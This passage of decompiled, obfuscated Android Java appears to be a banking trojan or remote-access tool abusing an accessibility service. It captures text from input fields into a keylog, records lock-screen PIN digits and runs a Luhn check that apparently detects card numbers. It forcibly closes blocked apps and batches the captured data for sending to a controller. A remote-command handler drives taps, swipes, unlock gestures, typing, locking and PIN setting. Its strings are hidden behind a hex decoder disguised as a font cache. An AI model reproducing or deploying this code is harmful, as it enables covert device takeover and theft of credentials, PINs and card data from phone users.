                AccessibilityNodeInfo rootInActiveWindow = dataQFAdapter.getRootInActiveWindow();
                if (rootInActiveWindow == null) {
                    return;
                }
                boolean zH9XlUr4OeMJFiXK = H9XlUr4OeMJFiXK(rootInActiveWindow, 0);
                rootInActiveWindow.recycle();
                if (zH9XlUr4OeMJFiXK) {
                    String unused = DataQFAdapter.TAG;
                    TypefaceCache.obtain("001700730043009300B000AF00D300B4003000610054009500F400FF00DE00A80020007D001B009400F300AD00D700A2002D0036005F008200E400BA00D100B300260072001B008100E200B000DF00E7");
                    TypefaceCache.obtain("006F00360048009300F100AD00C600AE002D0071001B009700FF00B300DE00A20031");
                    jdOQeRk37T35X5xKW1P();
                }
            } catch (Exception e) {
                String unused2 = DataQFAdapter.TAG;
                TypefaceCache.obtain("0020007E005E008400FB008F00D300B4003000610054009500F4009300DD00A4002800450058009500F500BA00DC00E7002600640049008800E200E50092");
                e.getMessage();
            }
        }
    }

    public static void w9sT1Swbhx3hs(String str) {
        Locale locale = Locale.ROOT;
        String lowerCase = str.toLowerCase(locale);
        DataQFAdapter.blockedApps.add(lowerCase);
        DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
        if (dataQFAdapter == null || !dataQFAdapter.currentApp.toLowerCase(locale).equals(lowerCase)) {
            return;
        }
        TypefaceCache.obtain("00150078005800A600F300BC00D700B40030007F0059008E00FC00B600C600BE");
        TypefaceCache.obtain("0021007A0054008400FB009E00C200B700790036004E009400F500AD009200AE003000360052008900B0");
        TypefaceCache.obtain("006300640052008000F800AB009200A9002C0061001700C700F600B000C000A4002A0078005C00C700F800B000DF00A2");
        dataQFAdapter.performGlobalAction(1);
        dataQFAdapter.safePostDelayed(new ssJAORu9Srr5Q9qO2sq(dataQFAdapter, 0), 150L);
        dataQFAdapter.safePostDelayed(new ssJAORu9Srr5Q9qO2sq(dataQFAdapter, 1), 500L);
    }

    public static String wotphlvK9sPbXJ(AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        String string;
        String string2;
        if (i > 15) {
            return null;
        }
        try {
            CharSequence className = accessibilityNodeInfo.getClassName();
            String str = "";
            if (className == null || (string = className.toString()) == null) {
                string = "";
            }
            if ((KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(string, TypefaceCache.obtain("000600720052009300C400BA00CA00B3"), true) || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(string, TypefaceCache.obtain("001300770048009400E700B000C000A3001700730043009300C600B600D700B0"), true) || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(string, TypefaceCache.obtain("000800730042008000E500BE00C000A3001300770048009400E700B000C000A30015007F005E0090"), true)) && (accessibilityNodeInfo.isEditable() || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(string, TypefaceCache.obtain("001300770048009400E700B000C000A3001700730043009300C600B600D700B0"), true))) {
                CharSequence text = accessibilityNodeInfo.getText();
                if (text != null && (string2 = text.toString()) != null) {
                    str = string2;
                }
                if (str.length() > 0) {
                    return str;
                }
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i2 = 0; i2 < childCount; i2++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
                if (child != null) {
                    String strWotphlvK9sPbXJ = wotphlvK9sPbXJ(child, i + 1);
                    child.recycle();
                    if (strWotphlvK9sPbXJ != null) {
                        return strWotphlvK9sPbXJ;
                    }
                }
            }
            return null;
        } catch (Exception unused) {
            return null;
        }
    }

    public static boolean xfn2GJwmGqs7kWW() {
        DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
        if (dataQFAdapter != null) {
            return dataQFAdapter.performGlobalAction(56 - 52);
        }
        return false;
    }

    public static boolean yTljMGnIibTRdOpSh4(String str) {
        if (str.length() >= 13) {
            int i = 0;
            boolean z = false;
            for (int length = str.length() - 1; (-81) + 80 < length; length--) {
                int iCharAt = str.charAt(length) - '0';
                if (z && (iCharAt = iCharAt * 2) > 9) {
                    iCharAt -= 9;
                }
                i += iCharAt;
                z = !z;
            }
            if (i % 10 == 0) {
                return true;
            }
        }
        return false;
    }

    public final synchronized JSONArray J0zjQ7CAgohuxU20eCW6() {
        JSONArray jSONArray;
        jSONArray = new JSONArray();
        Iterator it = DataQFAdapter.keylogEntries.iterator();
        while (it.hasNext()) {
            jSONArray.put(((NxAMaDFbSCxW6M03f) it.next()).dDIMxZXP1V8HdM());
        }
        return jSONArray;
    }

    public final synchronized void O2DHNSIGZlgPja7eqLgn(String str, String str2) {
        if (DataQFAdapter.lockScreenPackages.contains(str2)) {
            String strReplaceAll = Pattern.compile(TypefaceCache.obtain("00180048000B00CA00A90082")).matcher(str).replaceAll("");
            if (strReplaceAll.length() == 0) {
                return;
            }
            char cT9CXKrwDxrnFA6g23hZU = KgSM0TsKUpCiuePB.t9CXKrwDxrnFA6g23hZU(strReplaceAll);
            long jCurrentTimeMillis = System.currentTimeMillis();
            if (cT9CXKrwDxrnFA6g23hZU != DataQFAdapter.lastCapturedDigit || jCurrentTimeMillis - DataQFAdapter.lastCapturedDigitTime >= 600) {
                if (jCurrentTimeMillis - DataQFAdapter.pinDigitsTime > 10000) {
                    DataQFAdapter.pinDigits.setLength(0);
                }
                DataQFAdapter.pinDigits.append(cT9CXKrwDxrnFA6g23hZU);
                DataQFAdapter.pinDigitsTime = jCurrentTimeMillis;
                DataQFAdapter.lastCapturedDigit = cT9CXKrwDxrnFA6g23hZU;
                DataQFAdapter.lastCapturedDigitTime = jCurrentTimeMillis;
                String unused = DataQFAdapter.TAG;
                TypefaceCache.obtain("0013005F007500C700F400B600D500AE0037002C001B00CD00B000F700C600A800370077005700C7");
                DataQFAdapter.pinDigits.length();
                TypefaceCache.obtain("006A0036005D009500FF00B20092");
                Timer timer = DataQFAdapter.pinConfirmTimer;
                if (timer != null) {
                    timer.cancel();
                }
                DataQFAdapter.pinConfirmTimer = new Timer();
                Timer timer2 = DataQFAdapter.pinConfirmTimer;
                if (timer2 != null) {
                    timer2.schedule(new HM4aGJXSNeHl1YeqJkL(1), 3000L);
                }
            }
        }
    }

    public final synchronized void Qrz92kRPw4GcghAc() {
        if (DataQFAdapter.pendingBatch.isEmpty()) {
            return;
        }
        iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
        RWY6BVSB0XxPbw rWY6BVSB0XxPbw = RWY6BVSB0XxPbw.GUsyOYEIobMSb6n;
        int i = 0;
        if (rWY6BVSB0XxPbw == null) {
            if (DataQFAdapter.pendingBatch.size() > 200) {
                DataQFAdapter.pendingBatch.subList(0, DataQFAdapter.pendingBatch.size() - 200).clear();
            }
            return;
        }
        ArrayList arrayList = new ArrayList(DataQFAdapter.pendingBatch);
        DataQFAdapter.pendingBatch.clear();
        try {
            JSONArray jSONArray = new JSONArray();
            int size = arrayList.size();
            while (i < size) {
                Object obj = arrayList.get(i);
                i++;
                jSONArray.put(((NxAMaDFbSCxW6M03f) obj).dDIMxZXP1V8HdM());
            }
            JSONObject jSONObject = new JSONObject();
            jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("002F007F004D008200CF00B400D700BE002F0079005C009400CF00BD00D300B30020007E"));
            jSONObject.put(TypefaceCache.obtain("00260078004F009500F900BA00C1"), jSONArray);
            jSONObject.put(TypefaceCache.obtain("00200079004E008900E4"), jSONArray.length());
            rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK(jSONObject);
        } catch (Throwable th) {
            String unused = DataQFAdapter.TAG;
            TypefaceCache.obtain("00010077004F008400F800FF00D900A2003A007A0054008000B000AC00D700A900270036005E009500E200B000C000FD0063");
            th.getMessage();
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    public final boolean XiR1pIn5878vVWd(JSONObject jSONObject) {
        Context applicationContext;
        SharedPreferences sharedPreferences;
        SharedPreferences.Editor editorEdit;
        SharedPreferences.Editor editorPutString;
        DataQFAdapter dataQFAdapter;
        try {
            String strOptString = jSONObject.optString(TypefaceCache.obtain("00220075004F008E00FF00B1"), "");
            if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("0020007A0052008400FB"))) {
                int i = jSONObject.getInt("x");
                int i2 = jSONObject.getInt("y");
                DataQFAdapter dataQFAdapter2 = DataQFAdapter.instance;
                if (dataQFAdapter2 != null) {
                    return dataQFAdapter2.performClick(i, i2);
                }
                return false;
            }
            if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("003000610052009700F5"))) {
                int i3 = jSONObject.getInt(TypefaceCache.obtain("00300062005A009500E40087"));
                int i4 = jSONObject.getInt(TypefaceCache.obtain("00300062005A009500E40086"));
                int i5 = jSONObject.getInt(TypefaceCache.obtain("00260078005F00BF"));
                int i6 = jSONObject.getInt(TypefaceCache.obtain("00260078005F00BE"));
                long jOptLong = jSONObject.optLong(TypefaceCache.obtain("002700630049008600E400B600DD00A9"), 300L);
                DataQFAdapter dataQFAdapter3 = DataQFAdapter.instance;
                if (dataQFAdapter3 != null) {
                    return dataQFAdapter3.performSwipe(i3, i4, i5, i6, jOptLong);
                }
                return false;
            }
            boolean z = true;
            if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002400730048009300E500AD00D7009800330077004F008F"))) {
                JSONArray jSONArray = jSONObject.getJSONArray(TypefaceCache.obtain("003300790052008900E400AC"));
                long jOptLong2 = jSONObject.optLong(TypefaceCache.obtain("002700630049008600E400B600DD00A9"), 400L);
                if (jSONArray.length() < 2 || (dataQFAdapter = DataQFAdapter.instance) == null) {
                    return false;
                }
                Path path = new Path();
                JSONObject jSONObject2 = jSONArray.getJSONObject(0);
                path.moveTo(jSONObject2.getInt("x"), jSONObject2.getInt("y"));
                int length = jSONArray.length();
                for (int i7 = 1; i7 < length; i7++) {
                    JSONObject jSONObject3 = jSONArray.getJSONObject(i7);
                    path.lineTo(jSONObject3.getInt("x"), jSONObject3.getInt("y"));
                }
                dataQFAdapter.dispatchWithTouchBlockBypass(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, jOptLong2)).build(), TypefaceCache.obtain("002400730048009300E500AD00D7009800330077004F008F00B8") + jSONArray.length() + TypefaceCache.obtain("00630066004F009400B9"));
            } else {
                if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("003000750049008800FC00B300ED00B20033"))) {
                    return XuO9PPFo607ssKwZjNW();
                }
                if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("003000750049008800FC00B300ED00A3002C00610055"))) {
                    return iUQk66nAiXgO35();
                }
                if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002100770058008C"))) {
                    DataQFAdapter dataQFAdapter4 = DataQFAdapter.instance;
                    if (dataQFAdapter4 != null) {
                        return dataQFAdapter4.performGlobalAction(1);
                    }
                    return false;
                }
                if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002B007900560082"))) {
                    DataQFAdapter dataQFAdapter5 = DataQFAdapter.instance;
                    if (dataQFAdapter5 != null) {
                        return dataQFAdapter5.performGlobalAction(2);
                    }
                    return false;
                }
                if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("003100730058008200FE00AB00C1")) ? true : okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("003100730058008200FE00AB"))) {
                    DataQFAdapter dataQFAdapter6 = DataQFAdapter.instance;
                    if (dataQFAdapter6 != null) {
                        return dataQFAdapter6.performGlobalAction(3);
                    }
                    return false;
                }
                if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002D0079004F008E00F600B600D100A60037007F0054008900E3"))) {
                    return xfn2GJwmGqs7kWW();
                }
                if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002F00790058008C"))) {
                    return EWUjsTERgdPbSw3NNlN();
                }
                String str = null;
                String str2 = null;
                if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("003500790057009200FD00BA00ED00B20033"))) {
                    DataQFAdapter dataQFAdapter7 = DataQFAdapter.instance;
                    Object systemService = dataQFAdapter7 != null ? dataQFAdapter7.getSystemService("audio") : null;
                    AudioManager audioManager = systemService instanceof AudioManager ? (AudioManager) systemService : null;
                    if (audioManager != null) {
                        audioManager.adjustStreamVolume(3, 1, 1);
                    }
                    if (audioManager == null) {
                        return false;
                    }
                } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("003500790057009200FD00BA00ED00A3002C00610055"))) {
                    DataQFAdapter dataQFAdapter8 = DataQFAdapter.instance;
                    Object systemService2 = dataQFAdapter8 != null ? dataQFAdapter8.getSystemService("audio") : null;
                    AudioManager audioManager2 = systemService2 instanceof AudioManager ? (AudioManager) systemService2 : null;
                    if (audioManager2 != null) {
                        audioManager2.adjustStreamVolume(3, -1, 1);
                    }
                    if (audioManager2 == null) {
                        return false;
                    }
                } else {
                    if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002F00790058008C00CF00AC00D100B5002600730055"))) {
                        return EWUjsTERgdPbSw3NNlN();
                    }
                    if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("003000750049008200F500B100ED00A800250070"))) {
                        return EWUjsTERgdPbSw3NNlN();
                    }
                    if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("003000750049008200F500B100C100AF002C0062"))) {
                        return GiffeZJ1rbwyx();
                    }
                    if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("003400770050008200CF00AC00D100B5002600730055"))) {
                        DataQFAdapter dataQFAdapter9 = DataQFAdapter.instance;
                        if (dataQFAdapter9 != null) {
                            return dataQFAdapter9.performWakeScreen();
                        }
                        return false;
                    }
                    if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("003000750049008200F500B100ED00A8002D"))) {
                        DataQFAdapter dataQFAdapter10 = DataQFAdapter.instance;
                        if (dataQFAdapter10 != null) {
                            return dataQFAdapter10.performWakeScreen();
                        }
                        return false;
                    }
                    if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("00330079004C008200E2"))) {
                        DataQFAdapter dataQFAdapter11 = DataQFAdapter.instance;
                        if (dataQFAdapter11 != null) {
                            return dataQFAdapter11.performGlobalAction(6);
                        }
                        return false;
                    }
                    if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("00330079004C008200E2008000D600AE0022007A00540080"))) {
                        DataQFAdapter dataQFAdapter12 = DataQFAdapter.instance;
                        if (dataQFAdapter12 != null) {
                            return dataQFAdapter12.performGlobalAction(6);
                        }
                        return false;
                    }
                    if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("0037006F004B0082"))) {
                        String string = jSONObject.getString(TypefaceCache.obtain("0037007300430093"));
                        DataQFAdapter dataQFAdapter13 = DataQFAdapter.instance;
                        if (dataQFAdapter13 != null) {
                            return dataQFAdapter13.performTextInput(string);
                        }
                        return false;
                    }
                    if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002F00790055008000CF00BC00DE00AE0020007D"))) {
                        int i8 = jSONObject.getInt("x");
                        int i9 = jSONObject.getInt("y");
                        DataQFAdapter dataQFAdapter14 = DataQFAdapter.instance;
                        if (dataQFAdapter14 != null) {
                            return DataQFAdapter.performLongClick$default(dataQFAdapter14, i8, i9, 0L, 4, null);
                        }
                        return false;
                    }
                    if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("0030007E0054009000CF00B000C400A20031007A005A009E"))) {
                        jSONObject.optString(TypefaceCache.obtain("0037007F004F008B00F5"), TypefaceCache.checked("045D0427040604D904A204E4048704FA047B0423001B04A604A8049E04F004F2047F045D"));
                        jSONObject.optString(TypefaceCache.obtain("002E00730048009400F100B800D7"), TypefaceCache.checked("045C0428040D04D704AB049C048B048604010426001700C704AF04E1048604F904750422040304A504A500F1009C00E9"));
                        String strOptString2 = jSONObject.optString(TypefaceCache.obtain("0033007F0055"), "");
                        jSONObject.optBoolean(TypefaceCache.obtain("00310073004A009200F900AD00D700980033007F0055"), false);
                        if (DataQFAdapter.instance == null) {
                            return false;
                        }
                        String str3 = vbdyByOHPJmeGXlq.dDIMxZXP1V8HdM;
                        if ((strOptString2.length() == 0) == false) {
                            str2 = strOptString2;
                        }
                        vbdyByOHPJmeGXlq.J0zjQ7CAgohuxU20eCW6(str2);
                    } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002B007F005F008200CF00B000C400A20031007A005A009E"))) {
                        if (DataQFAdapter.instance == null) {
                            return false;
                        }
                        String str4 = vbdyByOHPJmeGXlq.dDIMxZXP1V8HdM;
                        vbdyByOHPJmeGXlq.hjneShqpF9Tis4();
                    } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("00300073004F00B800FF00A900D700B5002F0077004200B800E000B600DC"))) {
                        String string2 = jSONObject.getString(TypefaceCache.obtain("0033007F0055"));
                        String str5 = vbdyByOHPJmeGXlq.dDIMxZXP1V8HdM;
                        vbdyByOHPJmeGXlq.dTS0S7eC32ubQH54j36(string2);
                    } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002500770050008200CF00AA00C200A300220062005E00B800FF00B1"))) {
                        if (DataQFAdapter.instance == null) {
                            return false;
                        }
                        VpKcDcuRNaQkRJ5 vpKcDcuRNaQkRJ5 = VpKcDcuRNaQkRJ5.dDIMxZXP1V8HdM;
                        VpKcDcuRNaQkRJ5.J0zjQ7CAgohuxU20eCW6();
                        vbdyByOHPJmeGXlq.H9XlUr4OeMJFiXK(false);
                    } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002500770050008200CF00AA00C200A300220062005E00B800FF00B900D4"))) {
                        DataQFAdapter dataQFAdapter15 = DataQFAdapter.instance;
                        if (dataQFAdapter15 == null) {
                            return false;
                        }
                        VpKcDcuRNaQkRJ5 vpKcDcuRNaQkRJ6 = VpKcDcuRNaQkRJ5.dDIMxZXP1V8HdM;
                        VpKcDcuRNaQkRJ5.J0zjQ7CAgohuxU20eCW6();
                        String str6 = vbdyByOHPJmeGXlq.dDIMxZXP1V8HdM;
                        vbdyByOHPJmeGXlq.hjneShqpF9Tis4();
                        new Handler(Looper.getMainLooper()).postDelayed(new jdOQeRk37T35X5xKW1P(dataQFAdapter15), 300L);
                    } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002F0079005A008300F900B100D50098002C0078"))) {
                        if (DataQFAdapter.instance == null) {
                            return false;
                        }
                        vbdyByOHPJmeGXlq.DVTNwpDEVsUKuznof();
                    } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002F0079005A008300F900B100D50098002C0070005D"))) {
                        if (DataQFAdapter.instance == null) {
                            return false;
                        }
                        String str7 = vbdyByOHPJmeGXlq.dDIMxZXP1V8HdM;
                        vbdyByOHPJmeGXlq.hjneShqpF9Tis4();
                    } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("0021007A005A008400FB008000C100A400310073005E008900CF00B000DC"))) {
                        if (DataQFAdapter.instance == null) {
                            return false;
                        }
                        String str8 = vbdyByOHPJmeGXlq.dDIMxZXP1V8HdM;
                        vbdyByOHPJmeGXlq.XiR1pIn5878vVWd();
                    } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("0021007A005A008400FB008000C100A400310073005E008900CF00B000D400A1"))) {
                        if (DataQFAdapter.instance == null) {
                            return false;
                        }
                        String str9 = vbdyByOHPJmeGXlq.dDIMxZXP1V8HdM;
                        vbdyByOHPJmeGXlq.D5P1xCAyuvgF = false;
                        vbdyByOHPJmeGXlq.hjneShqpF9Tis4 = false;
                        vbdyByOHPJmeGXlq.hjneShqpF9Tis4();
                    } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002E00790052009400E400AA00C000A2001C00790055"))) {
                        if (DataQFAdapter.instance == null) {
                            return false;
                        }
                        String str10 = vbdyByOHPJmeGXlq.dDIMxZXP1V8HdM;
                        vbdyByOHPJmeGXlq.l1V0lQr6TbwNKqHfXNbb();
                    } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002E00790052009400E400AA00C000A2001C0079005D0081"))) {
                        if (DataQFAdapter.instance == null) {
                            return false;
                        }
                        String str11 = vbdyByOHPJmeGXlq.dDIMxZXP1V8HdM;
                        vbdyByOHPJmeGXlq.hjneShqpF9Tis4();
                    } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("00370079004E008400F8008000D000AB002C0075005000B800FF00B1"))) {
                        if (DataQFAdapter.instance == null) {
                            return false;
                        }
                        vbdyByOHPJmeGXlq.b1EoSIRjJHO5();
                    } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("00370079004E008400F8008000D000AB002C0075005000B800FF00B900D4"))) {
                        if (DataQFAdapter.instance == null) {
                            return false;
                        }
                        String str12 = vbdyByOHPJmeGXlq.dDIMxZXP1V8HdM;
                        vbdyByOHPJmeGXlq.ibVTtJUNfrGYbW();
                    } else if (!okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("00240073004F00B800E300B400D700AB0026006200540089")) && !okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("00310073005D009500F500AC00DA"))) {
                        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, "key")) {
                            int i10 = jSONObject.getInt(TypefaceCache.obtain("00280073004200A400FF00BB00D7"));
                            DataQFAdapter dataQFAdapter16 = DataQFAdapter.instance;
                            if (dataQFAdapter16 != null) {
                                return dataQFAdapter16.performKeyEvent(i10);
                            }
                            return false;
                        }
                        if (!okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("00240073004F00B800FB00BA00CB00AB002C00710048"))) {
                            if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("0020007A005E008600E2008000D900A2003A007A0054008000E3"))) {
                                xDyLpEZyrcKVe0();
                            } else {
                                if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("003600780057008800F300B400ED00B0002A0062005300B800E000B600DC"))) {
                                    String strOptString3 = jSONObject.optString(TypefaceCache.obtain("0033007F0055"), "");
                                    if (strOptString3.length() != 0) {
                                        z = false;
                                    }
                                    if (!z) {
                                        str = strOptString3;
                                    }
                                    return ajrMZmky8AIb2Pr(str);
                                }
                                if (!okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("00240073004F00B800E000B600DC"))) {
                                    if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("00300073004F00B800E000B600DC"))) {
                                        String string3 = jSONObject.getString(TypefaceCache.obtain("0033007F0055"));
                                        DataQFAdapter.capturedPin = string3;
                                        try {
                                            DataQFAdapter dataQFAdapter17 = DataQFAdapter.instance;
                                            if (dataQFAdapter17 != null && (applicationContext = dataQFAdapter17.getApplicationContext()) != null && (sharedPreferences = applicationContext.getSharedPreferences(TypefaceCache.obtain("00270073004D008E00F300BA00ED00B7002A0078"), 0)) != null && (editorEdit = sharedPreferences.edit()) != null && (editorPutString = editorEdit.putString(TypefaceCache.obtain("0033007F0055"), string3)) != null) {
                                                editorPutString.apply();
                                            }
                                        } catch (Exception unused) {
                                        }
                                    } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("00300062005A009500E4008000DE00AE003500730064008C00F500A600DE00A800240065"))) {
                                        euF5Udt5Rqv3Qmea(true);
                                    } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("003000620054009700CF00B300DB00B1002600490050008200E900B300DD00A00030"))) {
                                        euF5Udt5Rqv3Qmea(false);
                                    } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002A00780051008200F300AB00ED00B4003A00780058"))) {
                                        DataQFAdapter dataQFAdapter18 = DataQFAdapter.instance;
                                        if (dataQFAdapter18 != null) {
                                            String str13 = GQh1bKoqkKhujFH2nJ.dDIMxZXP1V8HdM;
                                            GQh1bKoqkKhujFH2nJ.D5P1xCAyuvgF(dataQFAdapter18);
                                        }
                                    } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002A00780051008200F300AB00ED00A2002D00770059008B00F5"))) {
                                        String str14 = GQh1bKoqkKhujFH2nJ.dDIMxZXP1V8HdM;
                                        GQh1bKoqkKhujFH2nJ.pyu8ovAipBTLYAiKab(true);
                                    } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002A00780051008200F300AB00ED00A3002A0065005A008500FC00BA"))) {
                                        String str15 = GQh1bKoqkKhujFH2nJ.dDIMxZXP1V8HdM;
                                        GQh1bKoqkKhujFH2nJ.pyu8ovAipBTLYAiKab(false);
                                    } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002A00780051008200F300AB00ED00B500260065005E009300CF00AC00D900AE00330065")) ? true : okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002A00780051008200F300AB00ED00B500260065005E009300CF00BC00D300B7003700630049008200E3"))) {
                                        String str16 = GQh1bKoqkKhujFH2nJ.dDIMxZXP1V8HdM;
                                        GQh1bKoqkKhujFH2nJ.b1EoSIRjJHO5.clear();
                                        TypefaceCache.obtain("0002007A005700C700F300BE00C200B300360064005E009400B000AD00D700B400260062");
                                    } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("003300730049008A00F900AC00C100AE002C0078004800B800F100AA00C600A8001C00710049008600FE00AB"))) {
                                        DataQFAdapter dataQFAdapter19 = DataQFAdapter.instance;
                                        if (dataQFAdapter19 != null) {
                                            VpKcDcuRNaQkRJ5.nQilHWaqS401ZtR(dataQFAdapter19);
                                        }
                                    } else if (!okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("003300730049008A00F900AC00C100AE002C0078004800B800E300AB00D300B300360065"))) {
                                        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("003300730049008A00F900AC00C100AE002C0078004800B800E300AB00DD00B7"))) {
                                            VpKcDcuRNaQkRJ5 vpKcDcuRNaQkRJ7 = VpKcDcuRNaQkRJ5.dDIMxZXP1V8HdM;
                                            VpKcDcuRNaQkRJ5.J0zjQ7CAgohuxU20eCW6();
                                        } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002C0066005E008900CF00B100DD00B3002A00700052008400F100AB00DB00A8002D00490057008E00E300AB00D700A900260064"))) {
                                            JW3Lh9hxwLsO2ArTlH(15000L);
                                            VpKcDcuRNaQkRJ5 vpKcDcuRNaQkRJ8 = VpKcDcuRNaQkRJ5.dDIMxZXP1V8HdM;
                                            VpKcDcuRNaQkRJ5.Qrz92kRPw4GcghAc();
                                            DataQFAdapter dataQFAdapter20 = DataQFAdapter.instance;
                                            if (dataQFAdapter20 != null) {
                                                VpKcDcuRNaQkRJ5.gIIiyi2ddlMDR0(dataQFAdapter20);
                                            }
                                        } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002C0066005E008900CF00B000C400A20031007A005A009E"))) {
                                            JW3Lh9hxwLsO2ArTlH(15000L);
                                            VpKcDcuRNaQkRJ5 vpKcDcuRNaQkRJ9 = VpKcDcuRNaQkRJ5.dDIMxZXP1V8HdM;
                                            VpKcDcuRNaQkRJ5.Qrz92kRPw4GcghAc();
                                            DataQFAdapter dataQFAdapter21 = DataQFAdapter.instance;
                                            if (dataQFAdapter21 != null) {
                                                VpKcDcuRNaQkRJ5.wotphlvK9sPbXJ(dataQFAdapter21);
                                            }
                                        } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002C0066005E008900CF00BB00D700A1002200630057009300CF00AC00DF00B4"))) {
                                            JW3Lh9hxwLsO2ArTlH(15000L);
                                            VpKcDcuRNaQkRJ5 vpKcDcuRNaQkRJ10 = VpKcDcuRNaQkRJ5.dDIMxZXP1V8HdM;
                                            VpKcDcuRNaQkRJ5.Qrz92kRPw4GcghAc();
                                            DataQFAdapter dataQFAdapter22 = DataQFAdapter.instance;
                                            if (dataQFAdapter22 != null) {
                                                VpKcDcuRNaQkRJ5.hjneShqpF9Tis4(dataQFAdapter22);
                                            }
                                        } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002C0066005E008900CF00BB00D700B1002A0075005E00B800F100BB00DF00AE002D"))) {
